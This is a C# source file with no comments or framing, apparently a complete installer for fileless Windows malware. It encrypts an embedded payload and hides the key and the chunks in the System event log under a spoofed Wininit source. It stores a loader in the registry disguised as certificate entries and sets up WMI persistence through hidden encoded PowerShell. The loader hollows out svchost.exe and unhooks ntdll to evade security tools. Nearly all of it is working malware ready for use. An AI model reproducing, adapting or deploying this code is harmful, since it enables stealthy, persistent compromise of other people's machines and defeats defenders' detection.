using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

class P
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr h, int c);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int MessageBox(IntPtr h, string t, string c, uint t2);
    const int SW = 5;
    const string SRC = "Microsoft-Windows-Wininit";
    const string FN = "UpdateFilter";
    const string CN = "UpdateConsumer";
    static int[] SC = new int[] { 18, 19, 20, 21, 22 };

    static void Main(string[] ax)
    {
        IntPtr hw = GetConsoleWindow();
        if (hw != IntPtr.Zero) ShowWindow(hw, SW);
        try
        {
            Console.WriteLine("Preparing payload...");
            byte[] payload;
            using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("payload.bin"))
            { payload = new byte[s.Length]; s.Read(payload, 0, payload.Length); }

            Console.WriteLine("Generating AES key...");
            byte[] ak = new byte[32]; byte[] iv = new byte[16];
            using (var r = new RNGCryptoServiceProvider()) { r.GetBytes(ak); r.GetBytes(iv); }

            Console.WriteLine("Writing key to event log...");
            ES();
            WE(18, GU(ak.Skip(0).Take(16).ToArray()));
            WE(19, GU(ak.Skip(16).Take(16).ToArray()));
            WE(20, GU(iv));

            Console.WriteLine("Encrypting payload...");
            byte[] enc;
            using (var a = Aes.Create()) { a.Key = ak; a.IV = iv; a.Mode = CipherMode.CBC; a.Padding = PaddingMode.PKCS7;
                using (var e = a.CreateEncryptor()) enc = e.TransformFinalBlock(payload, 0, payload.Length); }

            Console.WriteLine("Writing encrypted chunks...");
            string b = Convert.ToBase64String(enc);
            int o = 0, ci = 0; var rn = new Random();
            while (o < b.Length)
            {
                int sz = rn.Next(10000, 20000);
                if (o + sz > b.Length) sz = b.Length - o;
                WE(SC[ci % 5], "LC:" + ci + ":" + b.Substring(o, sz));
                o += sz; ci++;
            }
            Console.WriteLine("Chunks written (" + ci + " chunks)");

            Console.WriteLine("Storing loader in registry...");
            StoreLoaderInRegistry();

            Console.WriteLine("Creating WMI subscription (fileless)...");
            string wf = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 120";

            string cmd = BuildBootCommand();

            string pc = "Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='" + FN + "';QueryLanguage='WQL';Query='" + wf + "';EventNamespace='Root\\Cimv2'};" +
                "$c=Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='" + CN + "';CommandLineTemplate='" + cmd + "'};" +
                "Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"" + FN + "\"';Consumer='CommandLineEventConsumer.Name=\"" + CN + "\"'}";
            string bp = Convert.ToBase64String(Encoding.Unicode.GetBytes(pc));
            Process pr = Process.Start("powershell.exe", "-NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand " + bp);
            if (pr != null) pr.WaitForExit();

            Console.WriteLine("WMI subscription created (fileless)");
            Console.WriteLine();
            Console.WriteLine("Successful");
            MessageBox(IntPtr.Zero, "Setup completed successfully.\nReboot to activate.\nFully fileless - no files on disk.", "Done", 0x40);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed: " + ex.Message);
            MessageBox(IntPtr.Zero, "Setup failed:\n" + ex.Message, "Error", 0x10);
        }
    }

    static void StoreLoaderInRegistry()
    {
        string loaderCode = GetLoaderCode();
        string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(loaderCode));
        string keyPath = "Software\\Microsoft\\SystemCertificates\\SPC";
        using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(keyPath))
        {
            int chunkSize = 30000;
            int chunks = (b64.Length + chunkSize - 1) / chunkSize;
            key.SetValue("Count", chunks);
            for (int i = 0; i < chunks; i++)
            {
                int start = i * chunkSize;
                int len = Math.Min(chunkSize, b64.Length - start);
                key.SetValue("Cert" + i, b64.Substring(start, len));
            }
        }
    }

    static string GetLoaderCode()
    {
        return @"using System;using System.Collections.Generic;using System.Diagnostics;using System.IO;using System.Linq;using System.Reflection;using System.Runtime.InteropServices;using System.Security.Cryptography;using System.Text;class L{[DllImport(""kernel32.dll"")]static extern IntPtr OpenProcess(uint a,bool b,int c);[DllImport(""kernel32.dll"")]static extern bool CloseHandle(IntPtr h);[DllImport(""kernel32.dll"")]static extern bool CreateProcessA(string a,string b,IntPtr c,IntPtr d,bool e,uint f,IntPtr g,string h,byte[] i,ref XPI j);[DllImport(""kernel32.dll"")]static extern IntPtr VirtualAllocEx(IntPtr a,IntPtr b,uint c,uint d,uint e);[DllImport(""kernel32.dll"")]static extern bool VirtualProtectEx(IntPtr a,IntPtr b,uint c,uint d,out uint e);[DllImport(""kernel32.dll"")]static extern bool WriteProcessMemory(IntPtr a,IntPtr b,byte[] c,int d,IntPtr e);[DllImport(""kernel32.dll"")]static extern bool ReadProcessMemory(IntPtr a,IntPtr b,byte[] c,int d,IntPtr e);[DllImport(""kernel32.dll"")]static extern bool GetThreadContext(IntPtr a,byte[] b);[DllImport(""kernel32.dll"")]static extern bool SetThreadContext(IntPtr a,byte[] b);[DllImport(""kernel32.dll"")]static extern uint ResumeThread(IntPtr h);[DllImport(""kernel32.dll"")]static extern bool VirtualProtect(IntPtr a,uint b,uint c,out uint d);[DllImport(""kernel32.dll"")]static extern IntPtr GetModuleHandleA(string n);[DllImport(""kernel32.dll"")]static extern IntPtr GetCurrentProcess();[DllImport(""kernel32.dll"",CharSet=CharSet.Ansi)]static extern IntPtr CreateFileA(string a,uint b,uint c,IntPtr d,uint e,uint f,IntPtr g);[DllImport(""kernel32.dll"")]static extern bool ReadFile(IntPtr a,byte[] b,uint c,ref uint d,IntPtr e);[DllImport(""kernel32.dll"")]static extern uint SetFilePointer(IntPtr a,int b,IntPtr c,int d);[DllImport(""ntdll.dll"")]static extern int NtQueryInformationProcess(IntPtr a,int b,ref XPB c,int d,out int e);[DllImport(""ntdll.dll"")]static extern int NtUnmapViewOfSection(IntPtr a,IntPtr b);[StructLayout(LayoutKind.Sequential)]struct XPI{public IntPtr ph,th,pid,tid;}[StructLayout(LayoutKind.Sequential)]struct XPB{public IntPtr r1,pbi,r2,r3,r4,r5;}static uint xp;static string RS(byte[] d,int o){int e=o;while(e<d.Length&&d[e]!=0)e++;return Encoding.ASCII.GetString(d,o,e-o);}static IntPtr FM(IntPtr hp,string mn){XPB pb=new XPB();int r;NtQueryInformationProcess(hp,0,ref pb,Marshal.SizeOf(typeof(XPB)),out r);byte[] lb=new byte[8];ReadProcessMemory(hp,(IntPtr)((long)pb.pbi+0x18),lb,8,IntPtr.Zero);IntPtr ldr=(IntPtr)BitConverter.ToInt64(lb,0);byte[] hb=new byte[8];ReadProcessMemory(hp,(IntPtr)((long)ldr+0x10),hb,8,IntPtr.Zero);long head=BitConverter.ToInt64(hb,0),cur=head;for(int i=0;i<64;i++){byte[] fb=new byte[8];ReadProcessMemory(hp,(IntPtr)cur,fb,8,IntPtr.Zero);long nx=BitConverter.ToInt64(fb,0);if(nx==head)break;byte[] db=new byte[8];ReadProcessMemory(hp,(IntPtr)(nx+0x30),db,8,IntPtr.Zero);IntPtr b=(IntPtr)BitConverter.ToInt64(db,0);byte[] nl=new byte[2];ReadProcessMemory(hp,(IntPtr)(nx+0x54),nl,2,IntPtr.Zero);int nl2=BitConverter.ToInt16(nl,0);byte[] nb=new byte[8];ReadProcessMemory(hp,(IntPtr)(nx+0x5C),nb,8,IntPtr.Zero);long bp=BitConverter.ToInt64(nb,0);if(nl2>0&&nl2<200&&bp!=0){byte[] ns=new byte[nl2];ReadProcessMemory(hp,(IntPtr)bp,ns,nl2,IntPtr.Zero);if(Encoding.Unicode.GetString(ns).ToLower().Contains(mn.ToLower()))return b;}cur=nx;}return IntPtr.Zero;}static IntPtr RE(IntPtr hp,IntPtr mb,string fn){byte[] ph=new byte[4096];ReadProcessMemory(hp,mb,ph,4096,IntPtr.Zero);int po=BitConverter.ToInt32(ph,0x3C);int eRva=BitConverter.ToInt32(ph,po+24+112);if(eRva==0)return IntPtr.Zero;byte[] ed=new byte[40];ReadProcessMemory(hp,(IntPtr)((long)mb+eRva),ed,40,IntPtr.Zero);int nN=BitConverter.ToInt32(ed,24),fT=BitConverter.ToInt32(ed,28),nT=BitConverter.ToInt32(ed,32),nO=BitConverter.ToInt32(ed,36);for(int i=0;i<nN;i++){byte[] nr=new byte[4];ReadProcessMemory(hp,(IntPtr)((long)mb+nT+i*4),nr,4,IntPtr.Zero);int nRva=BitConverter.ToInt32(nr,0);byte[] nb=new byte[256];ReadProcessMemory(hp,(IntPtr)((long)mb+nRva),nb,256,IntPtr.Zero);string rn=RS(nb,0);if(rn==fn){byte[] or2=new byte[2];ReadProcessMemory(hp,(IntPtr)((long)mb+nO+i*2),or2,2,IntPtr.Zero);ushort ord=BitConverter.ToUInt16(or2,0);byte[] fr=new byte[4];ReadProcessMemory(hp,(IntPtr)((long)mb+fT+ord*4),fr,4,IntPtr.Zero);return(IntPtr)((long)mb+BitConverter.ToInt32(fr,0));}}return IntPtr.Zero;}static void RI(IntPtr hp,IntPtr pb,byte[] pe){int po=BitConverter.ToInt32(pe,0x3c),oo=po+24;int iRva=BitConverter.ToInt32(pe,oo+120);if(iRva==0)return;for(int d=0;;d++){int do2=iRva+d*20;int nRva=BitConverter.ToInt32(pe,do2+12),ilRva=BitConverter.ToInt32(pe,do2),iaRva=BitConverter.ToInt32(pe,do2+16);if(nRva==0)break;string dll=RS(pe,nRva);IntPtr db=FM(hp,dll);if(db==IntPtr.Zero)continue;if(ilRva==0)ilRva=iaRva;for(int j=0;;j++){ulong e=BitConverter.ToUInt64(pe,ilRva+j*8);if(e==0)break;string fn=null;if((e&0x8000000000000000)==0){int hRva=(int)(e&0x7FFFFFFF);fn=RS(pe,hRva+2);}if(fn==null)continue;IntPtr fa=RE(hp,db,fn);if(fa==IntPtr.Zero)continue;byte[] ab=BitConverter.GetBytes((long)fa);WriteProcessMemory(hp,(IntPtr)((long)pb+iaRva+j*8),ab,8,IntPtr.Zero);}}}static void AR(IntPtr hp,IntPtr pb,byte[] pe,long delta){int po=BitConverter.ToInt32(pe,0x3c),oo=po+24;int rRva=BitConverter.ToInt32(pe,oo+152),rSz=BitConverter.ToInt32(pe,oo+156);if(rRva==0)return;int p=0;while(p<rSz){int bRva=BitConverter.ToInt32(pe,rRva+p),bSz=BitConverter.ToInt32(pe,rRva+p+4);if(bSz==0)break;for(int i=8;i<bSz;i+=2){ushort e=BitConverter.ToUInt16(pe,rRva+p+i);if((e>>12)==3){long fa=(long)pb+bRva+(e&0xFFF);byte[] vb=new byte[8];ReadProcessMemory(hp,(IntPtr)fa,vb,8,IntPtr.Zero);long v=BitConverter.ToInt64(vb,0)+delta;WriteProcessMemory(hp,(IntPtr)fa,BitConverter.GetBytes(v),8,IntPtr.Zero);}}p+=bSz;}}static void Unhook(){try{IntPtr me=GetModuleHandleA(""ntdll.dll"");if(me==IntPtr.Zero)return;IntPtr hf=CreateFileA(""C:\\Windows\\System32\\ntdll.dll"",0x80000000,1,IntPtr.Zero,3,0,IntPtr.Zero);if(hf==(IntPtr)(-1))return;byte[] dh=new byte[4096];uint br=0;ReadFile(hf,dh,4096,ref br,IntPtr.Zero);int po=BitConverter.ToInt32(dh,0x3c),ns=BitConverter.ToInt16(dh,po+6),os=BitConverter.ToInt16(dh,po+20),so=po+24+os;long tRva=0;int tSz=0;for(int i=0;i<ns;i++){int ss=so+i*40;if(Encoding.ASCII.GetString(dh,ss,8).TrimEnd('\0')=="".text""){tSz=BitConverter.ToInt32(dh,ss+16);tRva=BitConverter.ToInt32(dh,ss+12);break;}}if(tSz==0){CloseHandle(hf);return;}uint fRaw=0;for(int i=0;i<ns;i++){int ss=so+i*40;if(Encoding.ASCII.GetString(dh,ss,8).TrimEnd('\0')=="".text""){fRaw=BitConverter.ToUInt32(dh,ss+20);break;}}SetFilePointer(hf,(int)fRaw,IntPtr.Zero,0);byte[] cl=new byte[tSz];ReadFile(hf,cl,(uint)tSz,ref br,IntPtr.Zero);CloseHandle(hf);byte[] dy=new byte[tSz];ReadProcessMemory(GetCurrentProcess(),(IntPtr)((long)me+tRva),dy,tSz,IntPtr.Zero);uint op;VirtualProtect((IntPtr)((long)me+tRva),(uint)tSz,0x40,out op);for(int i=0;i<tSz;i++){if(cl[i]!=dy[i]){int st=i;while(i<tSz&&cl[i]!=dy[i])i++;Marshal.Copy(cl,st,(IntPtr)((long)me+tRva+st),i-st);}}VirtualProtect((IntPtr)((long)me+tRva),(uint)tSz,op,out op);}catch{}}public static void R(byte[] pe){try{Unhook();int off=BitConverter.ToInt32(pe,0x3c);ushort mg=BitConverter.ToUInt16(pe,off+0x18);bool is64=(mg==0x20B);int opt=off+0x18;long ib=is64?BitConverter.ToInt64(pe,opt+0x18):BitConverter.ToInt32(pe,opt+0x1C);int isz=BitConverter.ToInt32(pe,opt+0x38),hs=BitConverter.ToInt32(pe,opt+0x3C),ep=BitConverter.ToInt32(pe,opt+0x10);for(int at=0;at<5;at++){byte[] si=new byte[104];si[0]=104;XPI pi=new XPI();if(!CreateProcessA(null,""svchost.exe -k netsvcs"",IntPtr.Zero,IntPtr.Zero,false,4,IntPtr.Zero,null,si,ref pi))continue;try{byte[] ctx=new byte[1232];BitConverter.GetBytes((uint)0x0010000B).CopyTo(ctx,48);if(!GetThreadContext(pi.th,ctx))goto fl;XPB pb=new XPB();int r;NtQueryInformationProcess(pi.ph,0,ref pb,Marshal.SizeOf(typeof(XPB)),out r);byte[] ib=new byte[8];ReadProcessMemory(pi.ph,(IntPtr)((long)pb.pbi+0x10),ib,8,IntPtr.Zero);IntPtr iba=(IntPtr)BitConverter.ToInt64(ib,0);NtUnmapViewOfSection(pi.ph,iba);IntPtr al=VirtualAllocEx(pi.ph,(IntPtr)ib,(uint)isz,0x3000,4);if(al==IntPtr.Zero)al=VirtualAllocEx(pi.ph,IntPtr.Zero,(uint)isz,0x3000,4);if(al==IntPtr.Zero)goto fl;byte[] hd=new byte[hs];Array.Copy(pe,0,hd,0,hs);WriteProcessMemory(pi.ph,al,hd,hs,IntPtr.Zero);int ns=BitConverter.ToInt16(pe,off+6);int sec=off+24+BitConverter.ToInt16(pe,off+20);for(int i=0;i<ns;i++){int s=sec+i*40;uint rs=(uint)BitConverter.ToInt32(pe,s+16);uint fr=(uint)BitConverter.ToInt32(pe,s+20),va=(uint)BitConverter.ToInt32(pe,s+12);if(rs==0)continue;byte[] sd=new byte[rs];Buffer.BlockCopy(pe,(int)fr,sd,0,(int)rs);string sn=Encoding.ASCII.GetString(pe,s,8).TrimEnd('\0');uint pt=4;if(sn=="".text"")pt=0x20;else if(sn=="".rdata""||sn=="".rsrc""||sn=="".reloc"")pt=2;IntPtr sa=(IntPtr)((long)al+va);WriteProcessMemory(pi.ph,sa,sd,(int)rs,IntPtr.Zero);VirtualProtectEx(pi.ph,sa,(uint)rs,pt,out xp);}VirtualProtectEx(pi.ph,al,(uint)hs,2,out xp);RI(pi.ph,al,pe);long dl=(long)al-ib;if(dl!=0)AR(pi.ph,al,pe,dl);long nr=(long)al+ep;BitConverter.GetBytes(nr).CopyTo(ctx,248);SetThreadContext(pi.th,ctx);ResumeThread(pi.th);CloseHandle(pi.th);CloseHandle(pi.ph);return;fl:TerminateProcess(pi.ph,0);CloseHandle(pi.ph);CloseHandle(pi.th);}catch{TerminateProcess(pi.ph,0);CloseHandle(pi.ph);CloseHandle(pi.th);}}}}";
    }

    static string BuildBootCommand()
    {
        string script =
            "$k=[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\\Microsoft\\SystemCertificates\\SPC');" +
            "$n=[int]$k.GetValue('Count');" +
            "$b64='';for($i=0;$i -lt $n;$i++){$b64+=$k.GetValue('Cert'+$i)}" +
            "$code=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64));" +
            "Add-Type -TypeDefinition $code -Language CSharp -ReferencedAssemblies 'System.dll','System.Security.dll';" +
            "$log=New-Object System.Diagnostics.EventLog('System');" +
            "$kp=@();foreach($e in $log.Entries){if($e.InstanceId -ge 18 -and $e.InstanceId -le 22 -and $e.Source -eq 'Microsoft-Windows-Wininit' -and -not $e.Message.StartsWith('LC:') -and $e.Message.StartsWith('{')){$kp+=,$e.Message;if($kp.Count -ge 3){break}}}" +
            "function G2B($g){$h=$g.Trim('{}').Replace('-','');$b=New-Object byte[] 16;for($i=0;$i -lt 16;$i++){$b[$i]=[Convert]::ToByte($h.Substring($i*2,2),16)};return $b}" +
            "$ak=New-Object byte[] 32;$t=G2B $kp[0];[Array]::Copy($t,0,$ak,0,16);$t=G2B $kp[1];[Array]::Copy($t,0,$ak,16,16);$iv=G2B $kp[2];" +
            "$ch=@{};foreach($e in $log.Entries){if($e.InstanceId -ge 18 -and $e.InstanceId -le 22 -and $e.Source -eq 'Microsoft-Windows-Wininit' -and $e.Message.StartsWith('LC:')){$m=$e.Message;$c=$m.IndexOf(':',3);$idx=[int]$m.Substring(3,$c-3);if(-not $ch.ContainsKey($idx)){$ch[$idx]=$m.Substring($c+1)}}}" +
            "$sb=New-Object Text.StringBuilder;foreach($kvp in $ch.GetEnumerator()|Sort-Object Name){$sb.Append($kvp.Value)}" +
            "$enc=[Convert]::FromBase64String($sb.ToString());" +
            "$aes=[Security.Cryptography.Aes]::Create();$aes.Key=$ak;$aes.IV=$iv;$aes.Mode='CBC';$aes.Padding='PKCS7';" +
            "$d=$aes.CreateDecryptor();$pe=$d.TransformFinalBlock($enc,0,$enc.Length);" +
            "[L]::R($pe)";

        return "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command \"" + script.Replace("\"", "\\\"") + "\"";
    }

    static void ES() { try { EventLog.CreateEventSource(SRC, "System"); } catch { } }
    static void WE(int id, string m) { using (var l = new EventLog("System")) { l.Source = SRC; l.WriteEntry(m, EventLogEntryType.Information, id); } }
    static string GU(byte[] d) { return "{" + string.Format("{0:X2}{1:X2}{2:X2}{3:X2}-{4:X2}{5:X2}-{6:X2}{7:X2}-{8:X2}{9:X2}-{10:X2}{11:X2}-{12:X2}{13:X2}-{14:X2}{15:X2}", d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7], d[8], d[9], d[10], d[11], d[12], d[13], d[14], d[15]) + "}"; }
}
